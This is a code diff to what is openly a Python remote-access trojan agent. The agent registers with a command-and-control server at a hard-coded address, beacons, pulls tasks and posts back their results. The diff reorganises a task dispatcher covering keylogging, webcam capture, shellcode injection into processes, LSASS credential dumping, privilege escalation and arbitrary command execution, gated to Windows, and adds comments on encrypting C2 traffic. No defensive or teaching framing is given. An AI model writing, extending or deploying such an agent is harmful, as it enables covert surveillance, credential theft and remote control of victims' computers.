@@ -9,8 +9,9 @@ import threading
 
 from datetime import datetime
 from modules.system_info import get_system_info
-from modules.common import encrypt_data, decrypt_data
+from modules.common import encrypt_data, decrypt_data  # Optional if using encrypted C2 traffic
 
+# Check OS
 IS_WINDOWS = platform.system().lower() == "windows"
 if IS_WINDOWS:
     from modules.evasion import Evasion
@@ -21,10 +22,13 @@ if IS_WINDOWS:
     from modules.priv_esc import PrivilegeEscalation
     from modules.post_exploit import PostExploit
 
+# === Configuration ===
 C2_URL = "http://192.168.220.141:5001"
 BEACON_INTERVAL = 10
 agent_id = f"agent_{uuid.uuid4()}"
+# ======================
 
+# Windows-specific module instances
 if IS_WINDOWS:
     evasion = Evasion()
     keylogger = Keylogger()
@@ -34,7 +38,9 @@ if IS_WINDOWS:
     priv_esc = PrivilegeEscalation()
     post_exp = PostExploit()
 
+# Logger setup
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
+
 
 def register():
     system_info = get_system_info()
@@ -53,6 +59,7 @@ def register():
     except Exception as e:
         logging.error(f"Registration error: {str(e)}")
 
+
 def send_beacon():
     while True:
         payload = {
@@ -67,6 +74,7 @@ def send_beacon():
         except Exception as e:
             logging.error("Error in beacon: " + str(e))
         time.sleep(BEACON_INTERVAL)
+
 
 def fetch_tasks():
     while True:
@@ -83,11 +91,14 @@ def fetch_tasks():
             logging.error("Error getting tasks: " + str(e))
         time.sleep(BEACON_INTERVAL)
 
+
 def send_result(task_id, result):
     payload = {
         "task_id": task_id,
         "agent_id": agent_id,
         "result": result
+        # Optionally encrypt here:
+        # "result": encrypt_data(result, "mykey123")
     }
     try:
         r = requests.post(f"{C2_URL}/api/results", json=payload)
@@ -96,6 +107,7 @@ def send_result(task_id, result):
     except Exception as e:
         logging.error("Error sending result: " + str(e))
 
+
 def run_task(task):
     task_id = task.get("id")
     task_type = task.get("type")
@@ -103,28 +115,31 @@ def run_task(task):
 
     try:
         result = None
-        if task_type == "keylogger":
-            result = keylogger.start()
-        elif task_type == "webcam":
-            result = webcam.capture()
-        elif task_type == "process_injection":
-            result = injector.inject(data.get("process"), data.get("shellcode"))
-        elif task_type == "credential_dump":
-            result = cred_dump.dump_lsass()
-        elif task_type == "privilege_escalation":
-            result = priv_esc.check_windows_services()
-        elif task_type == "post_exploit":
-            result = post_exp.execute(data.get("command"))
-        elif task_type == "system_info":
-            result = get_system_info()
-        else:
-            result = f"Unknown task: {task_type}"
 
-        if result:
-            send_result(task_id, result)
+        if IS_WINDOWS:
+            if task_type == "keylogger":
+                result = keylogger.start()
+            elif task_type == "webcam":
+                result = webcam.capture()
+            elif task_type == "process_injection":
+                result = injector.inject(data.get("process"), data.get("shellcode"))
+            elif task_type == "credential_dump":
+                result = cred_dump.dump_lsass()
+            elif task_type == "privilege_escalation":
+                result = priv_esc.check_windows_services()
+            elif task_type == "post_exploit":
+                result = post_exp.execute(data.get("command"))
+
+        if task_type == "system_info":
+            result = get_system_info()
+        elif result is None:
+            result = f"Unknown or unsupported task on this platform: {task_type}"
+
+        send_result(task_id, result)
 
     except Exception as e:
         send_result(task_id, f"Error: {str(e)}")
+
 
 def auto_task_post_startup():
     logging.info("Running startup modules...")
@@ -145,6 +160,7 @@ def auto_task_post_startup():
     for key, value in results.items():
         task_id = f"{key}_{datetime.now().strftime('%H%M%S')}"
         send_result(task_id, value)
+
 
 if __name__ == "__main__":
     register()
